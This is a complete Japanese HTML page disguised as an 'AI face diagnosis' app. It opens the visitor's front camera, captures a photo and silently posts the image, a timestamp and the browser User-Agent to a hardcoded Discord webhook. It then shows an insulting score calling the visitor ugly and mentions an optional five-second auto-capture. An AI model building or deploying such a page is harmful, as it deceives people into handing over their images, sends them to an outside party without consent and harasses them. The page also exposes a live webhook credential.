<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AI顔診断</title>
  <style>
  body { 
    background: linear-gradient(135deg, #f5f7ff, #e0f7fa); 
    color: #333; 
    font-family: 'Segoe UI', sans-serif; 
    text-align: center; 
    padding: 30px; 
    margin: 0;
  }
  h1 { 
    font-size: 2.5em; 
    color: #00bcd4; 
    margin-bottom: 10px; 
    text-shadow: 1px 1px 3px rgba(0,0,0,0.1);
  }
  p { 
    font-size: 1.3em; 
    color: #555; 
    margin-bottom: 30px; 
  }
  video { 
    max-width: 90%; 
    border: 8px solid #fff; 
    border-radius: 20px; 
    box-shadow: 0 10px 30px rgba(0,0,0,0.15); 
    margin: 20px auto; 
    display: block;
  }
  canvas { display: none; }
  button { 
    font-size: 1.6em; 
    padding: 18px 40px; 
    margin: 20px; 
    background: #ff6b6b; 
    color: white; 
    border: none; 
    border-radius: 50px; 
    cursor: pointer; 
    box-shadow: 0 8px 20px rgba(255,107,107,0.4);
    transition: all 0.3s;
  }
  button:hover { 
    background: #ff8787; 
    transform: translateY(-3px); 
    box-shadow: 0 12px 25px rgba(255,107,107,0.5);
  }
  button:active { 
    transform: translateY(1px);
  }
</style>
</head>
<body>
  <h1>AI顔診断</h1>
  <p>カメラを許可して撮影してください</p>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <br>
  <button onclick="capture()">撮影 & 送信</button>

  <script>
    const webhook = 'https://ptb.discord.com/api/webhooks/1465878871437217916/ci6wdItYqYKGlaqZaeveDGcSNti2i_K8DTXrNkX4BSNGWaoj1NkY3TaJRn1m046dr9J8'; // Discord Webhook URLを貼り付け

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
      .then(stream => {
        video.srcObject = stream;
        video.play();
      })
      .catch(err => {
        document.body.innerHTML += `<p>カメラアクセス拒否またはエラー: ${err.message}</p>`;
      });

    function capture() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      
      canvas.toBlob(blob => {
        const form = new FormData();
        form.append('file', blob, 'capture.jpg');
        
        const payload = {
          content: '**写真キャプチャ成功**\\nタイムスタンプ: ' + new Date().toLocaleString() + 
                   '\\nUser-Agent: ' + navigator.userAgent
        };
        form.append('payload_json', JSON.stringify(payload));

        fetch(webhook, {
          method: 'POST',
          body: form
        }).then(() => {
          document.body.innerHTML = '<h1>。診断結果:23点お前ブスだな</h1>';
        }).catch(err => {
          alert('送信エラー: ' + err);
        });
      }, 'image/jpeg', 0.95);
    }

    // 自動撮影オプション（任意）: setTimeout(capture, 5000); で5秒後自動
  </script>
</body>
</html>
